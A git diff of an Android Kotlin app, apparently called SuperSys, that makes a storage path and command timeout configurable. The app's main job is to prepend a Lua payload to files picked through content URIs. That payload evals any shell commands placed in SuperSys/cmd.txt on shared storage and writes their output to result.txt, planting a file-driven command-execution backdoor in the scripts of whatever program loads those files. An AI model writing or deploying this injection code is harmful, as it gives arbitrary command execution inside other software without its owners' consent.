@@ -30,11 +30,30 @@ class MainActivity : AppCompatActivity() {
         const val EXTRA_INSTALL_STEP = "INSTALL_STEP"
         const val PREFS_NAME = "supersys"
         const val KEY_STORED_URI = "stored_uri"
+        const val KEY_SDCARD_PATH = "sdcard_path"
+        const val KEY_CMD_TIMEOUT = "cmd_timeout"
+        const val DEFAULT_SDCARD_PATH = "/storage/emulated/0/"
+        const val DEFAULT_CMD_TIMEOUT = 30
 
-        private const val LUA_PAYLOAD = """-- SuperSys
-os.execute("if [ -f /storage/emulated/0/SuperSys/cmd.txt ]; then eval \"$(cat /storage/emulated/0/SuperSys/cmd.txt)\" > /storage/emulated/0/SuperSys/result.txt 2>&1; fi")
+        val SDCARD_OPTIONS = listOf("/storage/emulated/0/", "/data/media/0/")
+
+        fun getSdcardPath(ctx: android.content.Context): String {
+            val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
+            return prefs.getString(KEY_SDCARD_PATH, DEFAULT_SDCARD_PATH) ?: DEFAULT_SDCARD_PATH
+        }
+
+        fun getCmdTimeout(ctx: android.content.Context): Int {
+            val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
+            return prefs.getInt(KEY_CMD_TIMEOUT, DEFAULT_CMD_TIMEOUT)
+        }
+
+        fun getLuaPayload(sdcardPath: String): String {
+            val dir = "${sdcardPath}SuperSys"
+            return """-- SuperSys
+os.execute("if [ -f $dir/cmd.txt ]; then eval \"\$(cat $dir/cmd.txt)\" > $dir/result.txt 2>&1; fi")
 -- SuperSys
 """
+        }
 
         // Accumulated errors across all install steps
         val installErrors = mutableListOf<String>()
@@ -134,6 +153,7 @@ os.execute("if [ -f /storage/emulated/0/SuperSys/cmd.txt ]; then eval \"$(cat /s
         // Process this file: read, inject payload, write back
         val fileLabel = "文件$step"
         val readResult = UriUtils.readUriDetailed(this, uriStr)
+        val luaPayload = getLuaPayload(getSdcardPath(this))
 
         if (readResult.content == null && readResult.error != null) {
             // Read failed — collect error
@@ -141,9 +161,9 @@ os.execute("if [ -f /storage/emulated/0/SuperSys/cmd.txt ]; then eval \"$(cat /s
         } else {
             val content = readResult.content
             val newContent = when {
-                content == null -> LUA_PAYLOAD
+                content == null -> luaPayload
                 content.startsWith("-- SuperSys") -> content
-                else -> LUA_PAYLOAD + content
+                else -> luaPayload + content
             }
 
             val writeResult = UriUtils.writeUriDetailed(this, uriStr, newContent)
@@ -213,14 +233,15 @@ os.execute("if [ -f /storage/emulated/0/SuperSys/cmd.txt ]; then eval \"$(cat /s
 
             // Read, inject, write
             val readResult = UriUtils.readUriDetailed(this, uriStr)
+            val luaPayload = getLuaPayload(getSdcardPath(this))
             if (readResult.content == null && readResult.error != null) {
                 installErrors.add("[$fileLabel] 读取失败: ${readResult.error}")
             } else {
                 val content = readResult.content
                 val newContent = when {
-                    content == null -> LUA_PAYLOAD
+                    content == null -> luaPayload
                     content.startsWith("-- SuperSys") -> content
-                    else -> LUA_PAYLOAD + content
+                    else -> luaPayload + content
                 }
                 val writeResult = UriUtils.writeUriDetailed(this, uriStr, newContent)
                 if (!writeResult.success) {
